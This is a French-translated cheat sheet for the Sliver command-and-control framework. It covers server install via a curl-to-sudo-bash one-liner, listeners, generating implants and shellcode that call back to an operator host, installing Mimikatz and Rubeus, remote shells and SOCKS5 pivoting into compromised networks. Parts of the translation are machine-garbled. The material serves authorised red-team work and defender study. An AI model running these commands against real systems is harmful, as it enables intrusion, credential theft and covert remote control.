<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚔️ Sliver C2 - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ██████╗██████╗ 
  ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚════██╗
  ███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ██║      █████╔╝
  ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║     ██╔═══╝ 
  ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ╚██████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝
       Modern Open-Source Command & Control (C2) Framework by Bishop Fox
```
<p align="center">
  <img src="https://img.shields.io/badge/Sliver-C2_Framework-blue?style=for-the-badge" alt="Sliver">
  <img src="https://img.shields.io/badge/Author-Bishop_Fox-orange?style=for-the-badge" alt="Bishop Fox">
  <img src="https://img.shields.io/badge/Language-Go-cyan?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Category-C2_&_Red_Team-red?style=for-the-badge" alt="Équipe rouge">
</p>

<p align="center">
  <b>⚔️ Émulation d'adversaire moderne, multiplateforme et open source et cadre de commande et de contrôle prenant en charge les protocoles mTLS, WireGuard, HTTP(S) et DNS</b>
</p>

---

## 📋 Table des matières

- [Vue d'ensemble et architecture](#-overview--architecture)
- [Installation et configuration du serveur](#-installation--server-setup)
  - [Installation automatisée d'une seule ligne](#automated-one-liner-install)
  - [Configuration de l'opérateur multijoueur](#configuration de l'opérateur multijoueur)
- [Configuration de l'écouteur (mTLS, HTTP, WireGuard, DNS)](#-listener-configuration-mtls-http-wireguard-dns)
- [Génération d'implants (balises vs sessions)](#-génération-implants-balises-vs-sessions)
  -[Sessions interactives vs balises asynchrones](#interactive-sessions-vs-asynchronous-beacons)
  - [Implants Windows EXE et Shellcode](#windows-exe--shellcode-implants)
  - [Implants ELF Linux et macOS](#linux--macos-elf-implants)
- [Écosystème post-exploitation et armurerie](#-post-exploitation--armurerie-écosystème)
  -[Installation des extensions Armory (BOF, Donut, ceinture de sécurité)](#installing-armory-extensions-bofs-donut-seatbelt)
  - [Accès aux identifiants et Mimikatz](#credential-access--mimikatz)
  - [SOCKS5 pivotantes et dynamiques](#pivoting--dynamic-socks5)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et détection](#-considérations-defensives--détection)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et architecture

Conçu dans Go par **Bishop Fox**, **Sliver** est l'une des principales alternatives open source aux frameworks C2 commerciaux (Cobalt Strike, Brute Ratel) :
- **Multiplateforme :** Le serveur et les implants prennent en charge Windows, Linux et macOS sur `x86_64`, `arm64` et `arm`.
- **Communication évasive :** Prise en charge prête à l'emploi du TLS mutuel (mTLS), des tunnels WireGuard UDP, de HTTP/HTTPS avec génération Canary procédurale et du tunneling DNS.
- **Exécution en mémoire :** Injection de DLL réfléchissante native, fichiers d'objets balises (BOF), exécution .NET en ligne via Donut et processus de creusement.
- **Architecture multijoueur :** Collaboration en temps réel entre plusieurs opérateurs de l'équipe rouge via des profils d'opérateur signés cryptographiquement.

---

## 📥 Installation et configuration du serveur

### Installation automatisée d'une seule ligne
```bash
# Download and install sliver-server and sliver-client
curl -s https://sliver.sh/install | sudo bash

# Start the Sliver background daemon
sudo systemctl enable --now sliver
```
### Configuration de l'opérateur multijoueur
Créez un profil opérateur sur le serveur C2 pour un membre de l'équipe :
```bash
# On the C2 server
sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.sliver

# On the operator's laptop
sliver-client import /path/to/alice.sliver
sliver-client
```
---

## 🎧 Configuration de l'écouteur (mTLS, HTTP, WireGuard, DNS)

À l'intérieur de la console `sliver` :
```text
# Start mutual TLS listener on port 8888
[sliver] > mtls --lport 8888

# Start HTTPS listener on port 443 with automated Let's Encrypt certificates
[sliver] > https --lport 443 --domain c2.example.com

# Start lightweight WireGuard listener on port 53/UDP
[sliver] > wg --lport 53

# Verify running listeners
[sliver] > jobs
```
---

## 🚀 Génération d'implants (balises vs sessions)

### Sessions interactives vs balises asynchrones
- **Session :** Connexion TCP/TLS en temps réel avec réponse de commande instantanée. Visibilité accrue du réseau.
- **Beacon :** Battement de cœur asynchrone qui se met en veille pendant des intervalles avec une gigue aléatoire. Il est considérablement plus difficile pour les SOC d'identifier via l'analyse des anomalies du réseau.

### Implantations Windows EXE et Shellcode
```text
# Generate a Windows x64 interactive mTLS session implant
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe --save /tmp/payload.exe

# Generate a stealthy HTTP beacon implant with 60s sleep and 20% jitter
[sliver] > generate beacon --http https://c2.example.com:443 --seconds 60 --jitter 20 --os windows --format exe

# Generate raw x64 position-independent shellcode
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --format shellcode --save /tmp/shellcode.bin
```
### Implantations ELF Linux et macOS
```text
# Linux x64 ELF binary
[sliver] > generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf --save /tmp/agent.elf
```
---

## 🛠️ Écosystème Post-Exploitation & Armurerie

### Installation des extensions d'armurerie (BOF, beignet, ceinture de sécurité)
The Armory est le gestionnaire de packages intégré de Sliver pour les outils offensifs tiers et les fichiers objets Cobalt Strike Beacon (BOF) :
```text
# Update package list
[sliver] > armory update

# Install popular extensions
[sliver] > armory install bof-roast
[sliver] > armory install seatbelt
[sliver] > armory install rubeus
[sliver] > armory install mimikatz
```
### Interagir avec les sessions et les balises
```text
# List active sessions
[sliver] > sessions

# Interact with a specific session
[sliver] > use <SESSION_ID>

# Take a screenshot
[sliver] (session) > screenshot

# Spawn an interactive shell
[sliver] (session) > shell

# Execute .NET assembly in-memory without touching disk
[sliver] (session) > execute-assembly /opt/Seatbelt.exe -group=system
```
### CHAUSSETTES pivotantes et dynamiques5
Acheminez les outils offensifs externes directement vers le réseau cible compromis :
```text
# Start SOCKS5 proxy on local port 1080 of the C2 client
[sliver] (session) > socks5 start --port 1080

# Check active pivots
[sliver] > pivots
```
---

## ⚡ Tableau de référence rapide

| Objectif | Commande |
|-----------|---------|
| **Démarrer l'écouteur mTLS** | `mtls --lport 8888` |
| **Démarrer l'écouteur HTTPS** | `https --lport 443 --domain c2.domain.com` |
| **Générer un EXE de session** | `generate --mtls <IP>:8888 --os windows -f exe` |
| **Générer un EXE de balise** | `generate beacon --http <URL> --seconds 60 -f exe` |
| **Générer un shellcode brut** | `generate --mtls <IP>:8888 -f shellcode` |
| **Répertorier et interagir les sessions**| `sessions` -> `use <ID>` |
| **Installer les outils d'armurerie** | `armory install seatbelt mimikatz` |
| **Exécution .NET en mémoire**| `execute-assembly /path/to/binary.exe <args>` |
| ** Proxy inverse SOCKS5 ** | `socks5 start --port 1080` |

---

## 🛡️ Considérations défensives et détection

1. **Empreinte digitale JARM :** Les écouteurs HTTP Sliver par défaut peuvent être profilés à l'aide de l'empreinte digitale JARM TLS active. Personnalisez les chiffrements TLS dans la configuration Sliver.
2. **YARA et analyse binaire :** Les implants par défaut produits par `generate` contiennent des métadonnées et des structures de symboles Golang, sauf s'ils sont obscurcis via un brouillage (`--skip-symbols`).

---

## ⚠️ Mentions légales

> [!ATTENTION]
> Sliver est un framework avancé de simulation d'adversaire et de commandement et de contrôle d'équipe rouge. Il doit être déployé exclusivement dans le cadre d’engagements autorisés avec des règles d’engagement (RoE) claires. L'utilisation non autorisée sur des ordinateurs tiers est strictement illégale.